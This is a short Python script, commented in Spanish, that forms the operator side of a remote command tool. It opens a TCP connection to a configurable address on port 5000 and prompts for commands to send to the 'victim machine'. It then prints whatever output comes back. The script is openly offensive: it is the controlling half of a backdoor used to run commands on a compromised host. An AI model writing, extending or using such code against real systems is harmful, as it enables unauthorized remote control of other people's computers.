import socket
from colorama import Fore

color_verde = Fore.GREEN
color_amarillo = Fore.YELLOW
color_azul = Fore.BLUE

#Colocar ip entre las comillas
server_address = ('', 5000)

while True:
    client_socket = socket.socket()
    client_socket.connect(server_address)

    comando_enviar = input("\n" + color_azul + "Introduce el comando que quieres enviar a la maquina víctima o 'exit' para salir: ")
    if comando_enviar == 'exit':
        client_socket.close()
        break
    
    client_socket.send(comando_enviar.encode())

    # Ahora vamos a recibir la respuesta 

    respuesta = client_socket.recv(4096)
    print(respuesta.decode())

    client_socket.close()
